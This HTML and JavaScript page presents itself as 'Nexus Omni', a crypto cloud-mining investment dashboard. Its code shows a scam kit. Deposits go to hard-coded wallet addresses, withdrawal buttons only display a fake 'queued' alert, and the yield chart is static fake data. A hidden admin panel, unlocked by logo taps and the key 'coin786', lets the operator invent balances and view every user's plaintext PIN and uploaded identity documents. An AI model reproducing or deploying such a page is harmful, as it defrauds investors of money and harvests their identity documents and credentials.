<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Ultimate Ecosystem</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        
        :root { --n-blue: #2563eb; }
        body { background: #f8fafc; color: #000; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        
        /* Visibility Overrides */
        p, h1, h2, h3, h4, span, b, label { color: #000000 !important; font-weight: 700; }
        .text-white, .btn-center, .mining-card * { color: #ffffff !important; }
        
        /* Modern Cards */
        .glass-card { background: #ffffff !important; border-radius: 30px; border: 1px solid #e2e8f0; box-shadow: 0 10px 40px rgba(0,0,0,0.04); }
        .mining-card { background: #0f172a !important; border-radius: 35px; position: relative; overflow: hidden; box-shadow: 0 20px 50px rgba(15,23,42,0.3); }
        
        /* 20 Nodes Styling */
        .node-card { background: #fff !important; border-radius: 30px; border: 1px solid #e2e8f0; overflow: hidden; display: flex; flex-direction: column; margin-bottom: 25px; transition: 0.3s; text-align: center; }
        .node-img-area { width: 100%; height: 160px; background: #f1f5f9; display: flex; items-center justify-content: center; }
        .node-content { padding: 25px; }
        
        /* Centered Buttons */
        .btn-center { background: #2563eb !important; padding: 16px; border-radius: 20px; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; width: 85%; margin: 0 auto; display: block; box-shadow: 0 8px 20px rgba(37,99,235,0.2); }
        
        /* Inputs */
        .input-prime { background: #f1f5f9 !important; color: #000 !important; border: 2px solid #e2e8f0 !important; border-radius: 20px; padding: 18px; width: 100%; font-weight: 700; }
        
        nav { background: #ffffff !important; border-top: 1px solid #e2e8f0; height: 90px; }
        .nav-link { color: #94a3b8 !important; font-size: 9px; font-weight: 800; text-align: center; }
        .nav-link.active { color: #2563eb !important; }

        #preloader { position: fixed; inset: 0; background: #fff; z-index: 99999; display: flex; align-items: center; justify-content: center; }
        .badge-kyc { font-size: 9px; padding: 4px 12px; border-radius: 10px; font-weight: 900; text-transform: uppercase; }
    </style>
</head>
<body>

    <div id="preloader"><div class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div></div>

    <div id="main-view" class="hidden pb-36">
        <header class="p-6 bg-white sticky top-0 z-50 border-b flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-14 h-14 bg-black text-white rounded-[22px] flex items-center justify-center text-2xl font-black">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black uppercase tracking-tight">---</p>
                    <span id="kyc-badge" class="badge-kyc bg-amber-100 text-amber-600">Pending KYC</span>
                </div>
            </div>
            <button onclick="logout()" class="w-12 h-12 bg-slate-100 rounded-2xl flex items-center justify-center text-slate-400"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="tab-home" class="p-6 space-y-8">
            <div class="mining-card p-10">
                <p class="text-[10px] text-slate-400 uppercase tracking-[3px] font-bold">Protocol Balance</p>
                <h2 id="ui-bal" class="text-5xl font-black mt-2 tracking-tighter">$0.00</h2>
                <div class="h-28 mt-6"><canvas id="hashChart"></canvas></div>
                <div class="mt-8 pt-8 border-t border-white/10 flex justify-between">
                    <div><p class="text-[9px] text-slate-500 uppercase">Yield</p><p id="ui-prof" class="text-2xl font-black text-emerald-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[9px] text-slate-500 uppercase">Secure Code</p><p id="anti-phish" class="text-xs font-black text-blue-300">NX-0000</p></div>
                </div>
            </div>

            <div class="glass-card p-8 space-y-4">
                <h3 class="text-xs font-black uppercase text-blue-600">Identity Verification</h3>
                <p class="text-[11px] text-slate-500 leading-relaxed">Upload ID document to increase withdrawal limits to $50,000/day.</p>
                <input type="file" id="kyc-input" class="hidden" accept="image/*" onchange="handleKYC(this)">
                <button onclick="document.getElementById('kyc-input').click()" class="w-full py-4 bg-slate-900 text-white rounded-2xl text-[10px] font-black uppercase">Upload Document (Base64)</button>
            </div>

            <h3 class="text-[11px] text-slate-400 uppercase tracking-[5px] ml-1">My Active Infrastructure</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 hidden">
            <h3 class="text-xl font-black uppercase mb-8 tracking-tighter">Mining Infrastructure</h3>
            <div id="nodes-container" class="space-y-6"></div>
        </main>

        <main id="tab-vault" class="p-6 space-y-8 hidden">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase text-blue-600 tracking-widest">Deposit Gateway</h3>
                <select id="d-method" class="input-prime" onchange="showAddr()">
                    <option value="">Select Gateway</option>
                    <option value="TRX">Trust Wallet (TRX)</option>
                    <option value="ETH">MetaMask (ETH)</option>
                    <option value="USDT">Binance (USDT TRC20)</option>
                </select>
                <div id="d-box" class="hidden space-y-4 animate-pulse">
                    <div class="p-5 bg-blue-50 rounded-3xl border-2 border-blue-100">
                        <p id="d-addr" class="text-[10px] font-mono break-all text-center text-blue-600 font-black"></p>
                    </div>
                    <input type="number" placeholder="Enter Amount ($)" class="input-prime">
                    <button onclick="alert('Transaction under manual audit.')" class="btn-center !w-full !m-0 !bg-black">Submit Payment</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6 border-t-8 border-slate-900">
                <h3 class="text-xs font-black uppercase text-slate-500 tracking-widest">Withdrawal Terminal</h3>
                <select id="w-method" class="input-prime">
                    <option value="Binance">Binance Exchange</option>
                    <option value="OKX">OKX Terminal</option>
                    <option value="Bybit">Bybit Global</option>
                    <option value="Trust">Trust Wallet</option>
                </select>
                <input type="number" placeholder="Withdraw Amount ($)" class="input-prime">
                <input type="text" placeholder="Wallet Address / Account ID" class="input-prime">
                <button onclick="alert('Withdrawal queued. Processing time: 2-6 Hours.')" class="btn-center !w-full !m-0">Initialize Extraction</button>
            </div>
        </main>

        <main id="tab-legal" class="p-6 hidden space-y-10">
            <div><h4 class="text-blue-600 text-xs mb-3 uppercase tracking-widest">Corporate Profile</h4><p class="text-xs text-slate-600 leading-loose">Nexus Omni is a decentralized cloud-mining conglomerate. We specialize in high-hashrate infrastructure deployment across global nodes.</p></div>
            <div><h4 class="text-blue-600 text-xs mb-3 uppercase tracking-widest">Security Protocol</h4><p class="text-xs text-slate-600 leading-loose">User data is stored on-chain. We utilize AES-256 military-grade encryption for all financial transactions and identity logs.</p></div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 flex justify-around items-center px-4 z-[1000]">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-chart-pie text-2xl mb-1"></i><br>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-server text-2xl mb-1"></i><br>NODES</div>
            <div onclick="nav('vault')" class="nav-link"><i class="fa-solid fa-wallet text-2xl mb-1"></i><br>VAULT</div>
            <div onclick="nav('legal')" class="nav-link"><i class="fa-solid fa-shield-halved text-2xl mb-1"></i><br>LEGAL</div>
        </nav>
    </div>

    <div id="adm-panel" class="fixed inset-0 bg-white z-[10001] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b-2 pb-6"><h2 class="text-2xl font-black text-blue-600">MASTER CONTROL</h2><button onclick="document.getElementById('adm-panel').classList.add('hidden')" class="text-4xl">&times;</button></div>
        <div id="adm-users" class="space-y-6"></div>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-sm w-full space-y-12">
            <div class="text-center"><h1 class="text-6xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1></div>
            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Account ID" class="input-prime">
                <input type="password" id="l-pass" placeholder="PIN" class="input-prime">
                <button onclick="login()" class="btn-center !w-full !m-0 !bg-slate-900">Verify Identity</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] font-black text-blue-600 uppercase cursor-pointer">Register Profile</p>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Choose ID" class="input-prime">
                <input type="password" id="s-pass" placeholder="Create PIN" class="input-prime">
                <button onclick="signup()" class="btn-center !w-full !m-0 !bg-slate-900">Initialize Vault</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] font-black text-slate-500 uppercase cursor-pointer">Back to Login</p>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        // 20 Nodes Configuration
        const nodeLib = Array.from({length: 20}, (_, i) => ({
            id: i, name: i < 15 ? `Sovereign G-${i+1} Tier` : `Elite Omni Master v${i-14}`,
            price: i < 15 ? 200 + (i * 350) : 6000 + (i * 1200),
            yield: i < 15 ? 20 + (i * 30) : 900 + (i * 250)
        }));

        window.onload = () => {
            initChart(); renderNodes();
            setTimeout(() => document.getElementById('preloader').style.display='none', 1200);
            if(localStorage.getItem('nx_usr')) startSession(localStorage.getItem('nx_usr'));
        };

        function renderNodes() {
            document.getElementById('nodes-container').innerHTML = nodeLib.map(n => `
                <div class="node-card">
                    <div class="node-img-area"><i class="fa-solid fa-microchip text-4xl text-blue-200"></i></div>
                    <div class="node-content">
                        <h4 class="text-sm font-black uppercase mb-1">${n.name}</h4>
                        <p class="text-[10px] text-emerald-600 font-black mb-5">Yield: $${n.yield.toLocaleString()}/Day</p>
                        <p class="text-3xl font-black mb-6 tracking-tighter">$${n.price.toLocaleString()}</p>
                        <button onclick="buyNode(${n.id}, ${n.price}, '${n.name}')" class="btn-center">Activate Node</button>
                    </div>
                </div>`).join('');
        }

        window.showAddr = () => {
            const m = document.getElementById('d-method').value;
            const map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "ETH": "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" };
            document.getElementById('d-addr').innerText = map[m] || "";
            document.getElementById('d-box').classList.toggle('hidden', !m);
        };

        window.handleKYC = (input) => {
            const reader = new FileReader();
            reader.onload = async (e) => {
                const uid = localStorage.getItem('nx_usr');
                await update(ref(db, `users/${uid}`), { kycBase64: e.target.result, kyc: 'Under Review' });
                alert("Base64 Document Transmitted. Status: Reviewing.");
            };
            reader.readAsDataURL(input.files[0]);
        };

        window.login = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Verification Denied.");
        };

        window.signup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value;
            if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, kyc: 'Pending', phishCode: 'NX-'+Math.floor(1000+Math.random()*9000) }); toggleAuth(false); }
        };

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                document.getElementById('anti-phish').innerText = d.phishCode;
                document.getElementById('kyc-badge').innerText = d.kyc || 'Pending KYC';
                document.getElementById('kyc-badge').className = `badge-kyc ${d.kyc === 'Verified' ? 'bg-emerald-100 text-emerald-600' : 'bg-amber-100 text-amber-600'}`;
                const history = d.active_nodes ? Object.entries(d.active_nodes) : [];
                document.getElementById('active-list').innerHTML = history.map(([k, v]) => `<div class="glass-card p-6 flex justify-between items-center border-l-4 border-blue-600"><p class="text-[10px] font-black uppercase">${v.name}</p><span class="text-[8px] bg-blue-50 text-blue-600 px-3 py-1 rounded-full font-black">ONLINE</span></div>`).join('') || '<p class="text-center text-[10px] text-slate-400 py-6 font-black uppercase">No Infrastructure Found</p>';
            });
        }

        window.buyNode = async (id, price, name) => {
            const uid = localStorage.getItem('nx_usr'), s = await get(ref(db, `users/${uid}`));
            if(s.val().balance < price) return alert("Capital Mismatch.");
            await update(ref(db, `users/${uid}`), { balance: s.val().balance - price });
            await push(ref(db, `users/${uid}/active_nodes`), { name, timestamp: Date.now() });
            alert("Deployment Successful!"); nav('home');
        };

        // Secret Admin Logic
        let taps = 0; document.getElementById('logo-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Terminal Key:") === "coin786") { document.getElementById('adm-panel').classList.remove('hidden'); runAdm(); } taps = 0; } };

        function runAdm() {
            onValue(ref(db, 'users'), (s) => {
                const users = s.val();
                document.getElementById('adm-users').innerHTML = Object.entries(users).map(([id, d]) => `
                    <div class="bg-slate-50 p-6 rounded-3xl space-y-4">
                        <p class="text-[10px] font-black uppercase">${id} | PIN: ${d.password}</p>
                        ${d.kycBase64 ? `<img src="${d.kycBase64}" class="w-20 h-20 rounded-xl object-cover">` : '<p class="text-[8px] text-slate-400">NO ID UPLOADED</p>'}
                        <div class="flex gap-2">
                            <button onclick="modB('${id}')" class="bg-blue-600 text-white text-[9px] font-black px-4 py-2 rounded-xl">ADD BAL</button>
                            <button onclick="vfy('${id}')" class="bg-emerald-600 text-white text-[9px] font-black px-4 py-2 rounded-xl">VERIFY</button>
                        </div>
                    </div>`).join('');
            });
        }

        window.modB = async (u) => { const a = prompt("Amount:"); if(a) { const s = await get(ref(db, `users/${u}`)); await update(ref(db, `users/${u}`), { balance: (s.val().balance || 0) + parseFloat(a) }); }};
        window.vfy = async (u) => await update(ref(db, `users/${u}`), { kyc: 'Verified' });
        
        window.nav = (p) => { ['home','nodes','vault','legal'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        function initChart() { const ctx = document.getElementById('hashChart').getContext('2d'); new Chart(ctx, { type: 'line', data: { labels: ['','','','','','',''], datasets: [{ data: [40, 60, 45, 80, 55, 90, 70], borderColor: '#3b82f6', tension: 0.4, borderWidth: 3, pointRadius: 0 }]}, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false }}, scales: { x: { display: false }, y: { display: false }}}}); }
    </script>
</body>
</html>
